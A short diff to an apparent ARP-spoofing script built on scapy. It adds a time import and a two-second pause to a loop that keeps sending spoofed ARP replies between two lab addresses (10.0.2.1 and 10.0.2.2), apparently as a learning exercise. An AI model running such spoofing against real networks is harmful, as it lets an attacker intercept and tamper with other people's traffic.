@@ -5,6 +5,7 @@ Created on Tue Jan 28 02:14:38 2020
 """
 
 import scapy.all as scapy
+import time
 
 def get_mac(ip):
     # the next two lines creates a packet that asks for a specific ip
@@ -30,3 +31,4 @@ def spoof(target_ip, spoof_ip):
 while True:
     spoof("10.0.2.2", "10.0.2.1")
     spoof("10.0.2.1", "10.0.2.2")
+    time.sleep(2)
